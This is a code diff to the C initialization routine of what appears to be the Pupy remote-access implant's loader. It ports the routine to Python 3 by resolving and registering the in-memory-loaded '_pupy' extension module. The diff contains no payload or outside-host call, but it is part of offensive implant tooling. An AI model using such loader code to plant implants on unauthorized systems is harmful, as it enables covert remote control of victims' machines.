@@ -225,6 +225,7 @@ void OnAbortHandler(int signum)
 void initialize(BOOL isDll) {
     int i, argc = 0;
     char **argv = NULL;
+    char *oldcontext;
 
 #ifdef _PUPY_DYNLOAD
     _pupy_pyd_args_t args;
@@ -334,6 +335,7 @@ void initialize(BOOL isDll) {
 
     _set_abort_behavior(0, _WRITE_ABORT_MSG);
 
+    /*
     {
         HMODULE hMSVCR90 = MyGetModuleHandleA("MSVCR90");
         if (hMSVCR90) {
@@ -359,6 +361,7 @@ void initialize(BOOL isDll) {
             dprint("_set_abort_behavior/MSVCR90 - DLL was not loaded\n");
         }
     }
+    */
 
 #ifdef POSTMORTEM
     EnableCrashingOnCrashes();
@@ -380,7 +383,7 @@ void initialize(BOOL isDll) {
     args.blInitialized = FALSE;
 
     dprint("Load _pupy\n");
-    xz_dynload(
+    HMODULE pupyhMod = xz_dynload(
         "_pupy.pyd",
         _pupy_pyd_c_start, _pupy_pyd_c_size,
         &args
@@ -391,13 +394,31 @@ void initialize(BOOL isDll) {
         return;
     }
 
+    typedef FARPROC (*PyInit__pupyT)(void);
+    PyInit__pupyT PyInit__pupy;
+    PyInit__pupy = (PyInit__pupyT)MyGetProcAddress(pupyhMod, "PyInit__pupy");
+
+    oldcontext = _Py_PackageContext;
+    _Py_PackageContext = "_pupy";
+    PyObject *m = PyInit__pupy();
+    _Py_PackageContext = oldcontext;
+    
+    
+    PyObject *modules = NULL;
+    modules = PyImport_GetModuleDict();
+    PyObject *name = PyUnicode_FromString("_pupy");
+    _PyImport_FixupExtensionObject(m, name, name, modules);
+
+    Py_DECREF(name);
+    
+
     dprint("cbExit: %p\n", args.cbExit);
     dprint("pvMemoryLibraries: %p\n", args.pvMemoryLibraries);
 
     on_exit_session_cb = args.cbExit;
 
 #else
-    init_pupy();
+    PyInit_pupy();
 #endif
 
     return;
